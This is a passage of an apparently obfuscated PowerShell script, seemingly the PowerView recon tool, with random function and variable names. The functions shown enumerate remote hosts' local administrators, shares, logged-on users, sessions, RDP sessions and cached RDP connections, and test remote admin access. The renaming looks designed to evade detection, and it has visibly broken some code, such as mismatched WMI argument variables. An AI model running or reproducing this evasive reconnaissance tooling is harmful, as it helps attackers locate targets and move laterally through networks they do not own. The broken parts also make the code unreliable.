                if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                    $TYJIVmOK99 = $glIboXpK99::GetSize()
                    for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                        $Info = $UeHktdvI99 -as $glIboXpK99
                        $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                        $KUsFrgdb99 += $TYJIVmOK99
                        $KqYbWZot99 = New-Object PSObject
                        $KqYbWZot99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                        $KqYbWZot99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $KqYbWZot99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $KqYbWZot99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $KqYbWZot99
                    }
                    $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
                }
                else {
                    Write-Verbose "[Wheaties] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
                }
            }
            else {
                $EGqbIuns99 = [ADSI]"WinNT://$cXOPCAwl99,computer"
                $EGqbIuns99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $KqYbWZot99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $Group | Add-Member Noteproperty 'GroupName' ($KqYbWZot99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($KqYbWZot99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($KqYbWZot99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function stipends {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $SZjbzmKX99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $AlrHOHqQ99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            if ($AlrHOHqQ99 -eq 'API') {
                $TNhhTnXZ99 = 2
                $TuHFtCTR99 = [IntPtr]::Zero
                $FHpQkwbc99 = 0
                $wWzmonqN99 = 0
                $rVQOkgHx99 = 0
                $fYOedlSN99 = $eIekXKWj99::NetLocalGroupGetMembers($cXOPCAwl99, $SZjbzmKX99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
                $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
                $SvCMbRzc99 = @()
                if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                    $TYJIVmOK99 = $AAOdZRRi99::GetSize()
                    for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                        $Info = $UeHktdvI99 -as $AAOdZRRi99
                        $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                        $KUsFrgdb99 += $TYJIVmOK99
                        $LheQlAxo99 = ''
                        $zBVlYYvn99 = $hVuDLVbw99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$LheQlAxo99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($zBVlYYvn99 -eq 0) {
                            Write-Verbose "[stipends] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
                        }
                        else {
                            $cgTuSBdj99 = New-Object PSObject
                            $cgTuSBdj99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                            $cgTuSBdj99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                            $cgTuSBdj99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $cgTuSBdj99 | Add-Member Noteproperty 'SID' $LheQlAxo99
                            $sYCvPfIx99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $cgTuSBdj99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
                            $cgTuSBdj99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $SvCMbRzc99 += $cgTuSBdj99
                        }
                    }
                    $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
                    $JqPnXIZk99 = $SvCMbRzc99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($JqPnXIZk99) {
                        $JqPnXIZk99 = $JqPnXIZk99.Substring(0, $JqPnXIZk99.LastIndexOf('-'))
                        $SvCMbRzc99 | ForEach-Object {
                            if ($_.SID -match $JqPnXIZk99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $SvCMbRzc99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $SvCMbRzc99
                }
                else {
                    Write-Verbose "[stipends] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
                }
            }
            else {
                try {
                    $qsMDMLdO99 = [ADSI]"WinNT://$cXOPCAwl99/$SZjbzmKX99,group"
                    $qsMDMLdO99.psbase.Invoke('Members') | ForEach-Object {
                        $cgTuSBdj99 = New-Object PSObject
                        $cgTuSBdj99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                        $cgTuSBdj99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                        $JmxOsema99 = ([ADSI]$_)
                        $kyQNtJlp99 = $JmxOsema99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $sYCvPfIx99 = ($JmxOsema99.SchemaClassName -like 'group')
                        if(([regex]::Matches($kyQNtJlp99, '/')).count -eq 1) {
                            $OjkpjjAj99 = $True
                            $Name = $kyQNtJlp99.Replace('/', '\')
                        }
                        else {
                            $OjkpjjAj99 = $False
                            $Name = $kyQNtJlp99.Substring($kyQNtJlp99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $cgTuSBdj99 | Add-Member Noteproperty 'AccountName' $Name
                        $cgTuSBdj99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($JmxOsema99.InvokeGet('ObjectSID'),0)).Value)
                        $cgTuSBdj99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
                        $cgTuSBdj99 | Add-Member Noteproperty 'IsDomain' $OjkpjjAj99
                        $cgTuSBdj99
                    }
                }
                catch {
                    Write-Verbose "[stipends] Error for $cXOPCAwl99 : $_"
                }
            }
        }
    }
    
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function well {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $TNhhTnXZ99 = 1
            $TuHFtCTR99 = [IntPtr]::Zero
            $FHpQkwbc99 = 0
            $wWzmonqN99 = 0
            $rVQOkgHx99 = 0
            $fYOedlSN99 = $eIekXKWj99::NetShareEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                $TYJIVmOK99 = $LHsSdVmM99::GetSize()
                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                    $Info = $UeHktdvI99 -as $LHsSdVmM99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                    $KUsFrgdb99 += $TYJIVmOK99
                    $Share
                }
                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
            }
            else {
                Write-Verbose "[well] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function Darla {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $TNhhTnXZ99 = 1
            $TuHFtCTR99 = [IntPtr]::Zero
            $FHpQkwbc99 = 0
            $wWzmonqN99 = 0
            $rVQOkgHx99 = 0
            $fYOedlSN99 = $eIekXKWj99::NetWkstaUserEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                $TYJIVmOK99 = $AYxUHfXy99::GetSize()
                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                    $Info = $UeHktdvI99 -as $AYxUHfXy99
                    $FjaaNWoN99 = $Info | Select-Object *
                    $FjaaNWoN99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $FjaaNWoN99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                    $KUsFrgdb99 += $TYJIVmOK99
                    $FjaaNWoN99
                }
                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
            }
            else {
                Write-Verbose "[Darla] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function lagging {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $TNhhTnXZ99 = 10
            $TuHFtCTR99 = [IntPtr]::Zero
            $FHpQkwbc99 = 0
            $wWzmonqN99 = 0
            $rVQOkgHx99 = 0
            $fYOedlSN99 = $eIekXKWj99::NetSessionEnum($cXOPCAwl99, '', $IsWOPBva99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
                $TYJIVmOK99 = $LsQgOFsN99::GetSize()
                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                    $Info = $UeHktdvI99 -as $LsQgOFsN99
                    $ExnuZhXQ99 = $Info | Select-Object *
                    $ExnuZhXQ99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $ExnuZhXQ99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
                    $KUsFrgdb99 += $TYJIVmOK99
                    $ExnuZhXQ99
                }
                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
            }
            else {
                Write-Verbose "[lagging] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function deepening {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$VrEmrUHq99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $IsWOPBva99 = woodmen -ObjectSID $_ -OutputType 'DomainSimple'
                    if ($IsWOPBva99) {
                        $IsWOPBva99, $ojqqfkye99 = $IsWOPBva99.Split('@')
                    }
                    else {
                        $IsWOPBva99 = $_
                        $ojqqfkye99 = $Null
                    }
                    $dhXopAgv99 = New-Object PSObject
                    $dhXopAgv99 | Add-Member Noteproperty 'ComputerName' "$VrEmrUHq99"
                    $dhXopAgv99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
                    $dhXopAgv99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                    $dhXopAgv99 | Add-Member Noteproperty 'UserSID' $_
                    $dhXopAgv99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $dhXopAgv99
                }
            }
            catch {
                Write-Verbose "[deepening] Error opening remote registry on '$VrEmrUHq99' : $_"
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function sprucing {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $TSTkwzwk99 = $ppPvwAgU99::WTSOpenServerEx($cXOPCAwl99)
            if ($TSTkwzwk99 -ne 0) {
                $oUzPXxNr99 = [IntPtr]::Zero
                $vUANPdTP99 = 0
                $fYOedlSN99 = $ppPvwAgU99::WTSEnumerateSessionsEx($TSTkwzwk99, [ref]1, 0, [ref]$oUzPXxNr99, [ref]$vUANPdTP99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $KUsFrgdb99 = $oUzPXxNr99.ToInt64()
                if (($fYOedlSN99 -ne 0) -and ($KUsFrgdb99 -gt 0)) {
                    $TYJIVmOK99 = $lqYeGqBq99::GetSize()
                    for ($i = 0; ($i -lt $vUANPdTP99); $i++) {
                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
                        $Info = $UeHktdvI99 -as $lqYeGqBq99
                        $SPvcmVuz99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $SPvcmVuz99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $SPvcmVuz99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                        }
                        $SPvcmVuz99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $SPvcmVuz99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $SPvcmVuz99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $SPvcmVuz99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $SPvcmVuz99 | Add-Member Noteproperty 'State' $Info.State
                        $DgfWZFrF99 = [IntPtr]::Zero
                        $fRxZfNtQ99 = 0
                        $zBVlYYvn99 = $ppPvwAgU99::WTSQuerySessionInformation($TSTkwzwk99, $Info.SessionID, 14, [ref]$DgfWZFrF99, [ref]$fRxZfNtQ99);$MJcEOQfi99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($zBVlYYvn99 -eq 0) {
                            Write-Verbose "[sprucing] Error: $(([ComponentModel.Win32Exception] $MJcEOQfi99).Message)"
                        }
                        else {
                            $tOZXPXDf99 = $DgfWZFrF99.ToInt64()
                            $wtMnQwrr99 = New-Object System.Intptr -ArgumentList $tOZXPXDf99
                            $Info2 = $wtMnQwrr99 -as $sKmvEYbz99
                            $fOClxxNd99 = $Info2.Address
                            if ($fOClxxNd99[2] -ne 0) {
                                $fOClxxNd99 = [String]$fOClxxNd99[2]+'.'+[String]$fOClxxNd99[3]+'.'+[String]$fOClxxNd99[4]+'.'+[String]$fOClxxNd99[5]
                            }
                            else {
                                $fOClxxNd99 = $Null
                            }
                            $SPvcmVuz99 | Add-Member Noteproperty 'SourceIP' $fOClxxNd99
                            $SPvcmVuz99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $SPvcmVuz99
                            $Null = $ppPvwAgU99::WTSFreeMemory($DgfWZFrF99)
                            $KUsFrgdb99 += $TYJIVmOK99
                        }
                    }
                    $Null = $ppPvwAgU99::WTSFreeMemoryEx(2, $oUzPXxNr99, $vUANPdTP99)
                }
                else {
                    Write-Verbose "[sprucing] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
                }
                $Null = $ppPvwAgU99::WTSCloseServer($TSTkwzwk99)
            }
            else {
                Write-Verbose "[sprucing] Error opening the Remote Desktop Session Host (RD Session Host) server for: $VrEmrUHq99"
            }
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function Abelson {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $TSTkwzwk99 = $hVuDLVbw99::OpenSCManagerW("\\$cXOPCAwl99", 'ServicesActive', 0xF003F);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $dohfMDea99 = New-Object PSObject
            $dohfMDea99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
            if ($TSTkwzwk99 -ne 0) {
                $Null = $hVuDLVbw99::CloseServiceHandle($TSTkwzwk99)
                $dohfMDea99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Abelson] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
                $dohfMDea99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $dohfMDea99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $dohfMDea99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function tussled {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $WUqPycDr99 = admonished -Credential $gxazvivN99
        }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            if ($cXOPCAwl99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $wStfQnQJ99 = $cXOPCAwl99
                $cXOPCAwl99 = [System.Net.Dns]::GetHostByAddress($cXOPCAwl99) | Select-Object -ExpandProperty HostName
            }
            else {
                $wStfQnQJ99 = @(erupt -ComputerName $cXOPCAwl99)[0].IPAddress
            }
            $TuHFtCTR99 = [IntPtr]::Zero
            $fYOedlSN99 = $eIekXKWj99::DsGetSiteName($cXOPCAwl99, [ref]$TuHFtCTR99)
            $UFJqwyIQ99 = New-Object PSObject
            $UFJqwyIQ99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
            $UFJqwyIQ99 | Add-Member Noteproperty 'IPAddress' $wStfQnQJ99
            if ($fYOedlSN99 -eq 0) {
                $nqApdsmI99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($TuHFtCTR99)
                $UFJqwyIQ99 | Add-Member Noteproperty 'SiteName' $nqApdsmI99
            }
            else {
                Write-Verbose "[tussled] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
                $UFJqwyIQ99 | Add-Member Noteproperty 'SiteName' ''
            }
            $UFJqwyIQ99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
            $UFJqwyIQ99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function Amritsar {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            try {
                $eWmMvJNh99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $cXOPCAwl99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
                $THcCEApd99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $FeBmzisx99 = $THcCEApd99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $bgiQmhUe99 = $THcCEApd99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($bgiQmhUe99 -and ($bgiQmhUe99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($bgiQmhUe99)
                    }
                    catch {
                        Write-Warning "[Amritsar] Error connecting to AutoConfigURL : $bgiQmhUe99"
                    }
                }
                if ($FeBmzisx99 -or $bgiQmhUe99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $Out | Add-Member Noteproperty 'ProxyServer' $FeBmzisx99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $bgiQmhUe99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Amritsar] No proxy settings found for $VrEmrUHq99"
                }
            }
            catch {
                Write-Warning "[Amritsar] Error enumerating proxy settings for $VrEmrUHq99 : $_"
            }
        }
    }
}
function evangelize {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $HKLM = 2147483650
            $eWmMvJNh99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $cXOPCAwl99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $ckQOEwvL99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $qcoKLChi99 = New-Object PSObject
                $qcoKLChi99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                $qcoKLChi99 | Add-Member Noteproperty 'LastLoggedOn' $ckQOEwvL99
                $qcoKLChi99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $qcoKLChi99
            }
            catch {
                Write-Warning "[evangelize] Error opening remote registry on $cXOPCAwl99. Remote registry likely not enabled."
            }
        }
    }
}
function mosque {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $HKU = 2147483651
            $eWmMvJNh99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $cXOPCAwl99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $dvPUhiLr99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($XnuUVOWC99 in $dvPUhiLr99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99 -Credential $gxazvivN99
                        }
                        else {
                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99
                        }
                        $khpugUEc99 = $Reg.EnumValues($HKU,"$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($BgZScByU99 in $khpugUEc99) {
                            if ($BgZScByU99 -match 'MRU.*') {
                                $ZAvweIpx99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Default", $BgZScByU99).sValue
                                $baPgXeJe99 = New-Object PSObject
                                $baPgXeJe99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
